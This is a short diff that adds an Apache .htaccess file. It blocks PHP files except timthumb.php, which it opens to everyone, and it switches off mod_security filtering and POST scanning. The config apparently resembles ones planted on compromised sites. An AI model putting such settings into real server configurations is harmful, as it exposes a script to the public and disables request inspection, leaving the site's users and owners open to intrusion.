@@ -1,0 +1,15 @@
+<Files *.php>
+Order Deny,Allow
+Deny from all
+Allow from 127.0.0.1
+</Files>
+
+<Files timthumb.php>
+Order Allow,Deny
+Allow from all
+</Files>
+
+<IfModule mod_security.c>
+SecFilterEngine Off
+SecFilterScanPOST Off
+</IfModule>
